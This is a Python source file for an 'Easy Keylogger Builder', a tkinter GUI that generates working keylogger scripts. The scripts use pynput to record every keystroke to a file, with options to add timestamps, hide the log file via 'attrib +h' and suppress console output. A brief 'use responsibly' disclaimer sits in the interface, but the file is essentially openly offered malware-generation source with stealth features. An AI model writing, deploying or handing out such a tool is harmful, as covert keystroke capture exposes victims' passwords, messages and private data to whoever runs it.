import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import os

class KeyloggerBuilder:
    def __init__(self, root):
        self.root = root
        self.root.title("Easy Keylogger Builder")
        self.root.geometry("600x500")
        self.root.resizable(False, False)
        
        # Header
        header = tk.Label(root, text="🔐 Easy Keylogger Builder", 
                         font=("Arial", 18, "bold"), fg="#2c3e50")
        header.pack(pady=15)
        
        # Main Frame
        main_frame = tk.Frame(root, padx=20, pady=10)
        main_frame.pack(fill="both", expand=True)
        
        # File Location
        tk.Label(main_frame, text="Log File Location:", 
                font=("Arial", 10, "bold")).grid(row=0, column=0, sticky="w", pady=5)
        
        location_frame = tk.Frame(main_frame)
        location_frame.grid(row=1, column=0, columnspan=2, sticky="ew", pady=5)
        
        self.location_var = tk.StringVar(value="Desktop")
        locations = ["Desktop", "Documents", "Downloads", "Custom Path"]
        self.location_dropdown = ttk.Combobox(location_frame, textvariable=self.location_var, 
                                             values=locations, state="readonly", width=30)
        self.location_dropdown.pack(side="left", padx=(0, 10))
        self.location_dropdown.bind("<<ComboboxSelected>>", self.on_location_change)
        
        self.browse_btn = tk.Button(location_frame, text="Browse", 
                                    command=self.browse_path, state="disabled")
        self.browse_btn.pack(side="left")
        
        # Custom Path Entry
        self.custom_path = tk.StringVar()
        self.path_entry = tk.Entry(main_frame, textvariable=self.custom_path, 
                                   width=50, state="disabled")
        self.path_entry.grid(row=2, column=0, columnspan=2, pady=5)
        
        # File Name
        tk.Label(main_frame, text="Log File Name:", 
                font=("Arial", 10, "bold")).grid(row=3, column=0, sticky="w", pady=(15, 5))
        
        self.filename_var = tk.StringVar(value="keylog.txt")
        tk.Entry(main_frame, textvariable=self.filename_var, 
                width=50).grid(row=4, column=0, columnspan=2, pady=5)
        
        # Features
        tk.Label(main_frame, text="Features:", 
                font=("Arial", 10, "bold")).grid(row=5, column=0, sticky="w", pady=(15, 5))
        
        features_frame = tk.Frame(main_frame)
        features_frame.grid(row=6, column=0, columnspan=2, sticky="w", pady=5)
        
        self.timestamp_var = tk.BooleanVar(value=False)
        tk.Checkbutton(features_frame, text="Add Timestamps", 
                      variable=self.timestamp_var).pack(anchor="w")
        
        self.hide_file_var = tk.BooleanVar(value=False)
        tk.Checkbutton(features_frame, text="Hide Log File (Windows only)", 
                      variable=self.hide_file_var).pack(anchor="w")
        
        self.show_console_var = tk.BooleanVar(value=True)
        tk.Checkbutton(features_frame, text="Show Console Output", 
                      variable=self.show_console_var).pack(anchor="w")
        
        # Buttons
        button_frame = tk.Frame(main_frame)
        button_frame.grid(row=7, column=0, columnspan=2, pady=20)
        
        tk.Button(button_frame, text="Generate Code", command=self.generate_code,
                 bg="#27ae60", fg="white", font=("Arial", 11, "bold"),
                 padx=20, pady=8).pack(side="left", padx=5)
        
        tk.Button(button_frame, text="Save as .py File", command=self.save_file,
                 bg="#3498db", fg="white", font=("Arial", 11, "bold"),
                 padx=20, pady=8).pack(side="left", padx=5)
        
        # Instructions
        instructions = """
⚠️ IMPORTANT NOTES:
• Use responsibly and legally - only on your own devices
• Install pynput first: pip install pynput
• Run as administrator for best results
• Press Ctrl+C in terminal to stop the keylogger
        """
        
        tk.Label(main_frame, text=instructions, justify="left", 
                fg="#e74c3c", font=("Arial", 8)).grid(row=8, column=0, 
                                                      columnspan=2, pady=10)
        
        self.generated_code = ""
    
    def on_location_change(self, event=None):
        if self.location_var.get() == "Custom Path":
            self.browse_btn.config(state="normal")
            self.path_entry.config(state="normal")
        else:
            self.browse_btn.config(state="disabled")
            self.path_entry.config(state="disabled")
    
    def browse_path(self):
        path = filedialog.askdirectory()
        if path:
            self.custom_path.set(path)
    
    def get_log_path(self):
        location = self.location_var.get()
        filename = self.filename_var.get()
        
        if location == "Desktop":
            return f'os.path.join(os.path.expanduser("~"), "Desktop", "{filename}")'
        elif location == "Documents":
            return f'os.path.join(os.path.expanduser("~"), "Documents", "{filename}")'
        elif location == "Downloads":
            return f'os.path.join(os.path.expanduser("~"), "Downloads", "{filename}")'
        else:
            custom = self.custom_path.get()
            if not custom:
                messagebox.showerror("Error", "Please select a custom path!")
                return None
            return f'r"{custom}\\{filename}"'
    
    def generate_code(self):
        log_path = self.get_log_path()
        if not log_path:
            return
        
        code = f"""from pynput.keyboard import Listener, Key
import os
{"import time" if self.timestamp_var.get() else ""}

log_file = {log_path}

"""
        
        if self.show_console_var.get():
            code += """print("=" * 50)
print("KEYLOGGER STARTED")
print(f"Log file: {log_file}")
print("Press Ctrl+C to stop")
print("=" * 50)

"""
        
        code += """def on_press(key):
    try:
        key_str = key.char
    except AttributeError:
        if key == Key.space:
            key_str = " "
        elif key == Key.enter:
            key_str = "\\n"
        elif key == Key.backspace:
            key_str = "[BACKSPACE]"
        else:
            key_str = f"[{key}]"
    
    try:
        with open(log_file, "a", encoding="utf-8") as f:
"""
        
        if self.timestamp_var.get():
            code += """            f.write(f"[{time.ctime()}] {key_str}")
"""
        else:
            code += """            f.write(key_str)
"""
        
        if self.show_console_var.get():
            code += """        print(f"✓ {key_str}", end="", flush=True)
"""
        
        code += """    except Exception as e:
"""
        
        if self.show_console_var.get():
            code += """        print(f"\\n✗ Error: {e}")
"""
        else:
            code += """        pass
"""
        
        code += """
# Create file if it doesn't exist
if not os.path.exists(log_file):
    open(log_file, "w").close()
"""
        
        if self.show_console_var.get():
            code += """    print("✓ Log file created\\n")
"""
        
        if self.hide_file_var.get():
            code += """
# Hide file (Windows only)
try:
    os.system(f'attrib +h "{log_file}"')
except:
    pass

"""
        
        code += """
try:
    with Listener(on_press=on_press) as listener:
        listener.join()
except KeyboardInterrupt:
"""
        
        if self.show_console_var.get():
            code += """    print("\\n\\n✓ Keylogger stopped!")
    print(f"Check file: {log_file}")
"""
        else:
            code += """    pass
"""
        
        self.generated_code = code
        
        # Show preview
        preview_window = tk.Toplevel(self.root)
        preview_window.title("Generated Code Preview")
        preview_window.geometry("700x500")
        
        text_widget = tk.Text(preview_window, wrap="word", font=("Consolas", 10))
        text_widget.pack(fill="both", expand=True, padx=10, pady=10)
        text_widget.insert("1.0", code)
        text_widget.config(state="disabled")
        
        # Add scrollbar
        scrollbar = tk.Scrollbar(text_widget)
        scrollbar.pack(side="right", fill="y")
        text_widget.config(yscrollcommand=scrollbar.set)
        scrollbar.config(command=text_widget.yview)
        
        messagebox.showinfo("Success", "Code generated successfully!")
    
    def save_file(self):
        if not self.generated_code:
            messagebox.showwarning("Warning", "Please generate code first!")
            return
        
        file_path = filedialog.asksaveasfilename(
            defaultextension=".py",
            filetypes=[("Python files", "*.py"), ("All files", "*.*")]
        )
        
        if file_path:
            try:
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write(self.generated_code)
                messagebox.showinfo("Success", f"File saved successfully!\n{file_path}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save file:\n{e}")

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerBuilder(root)
    root.mainloop()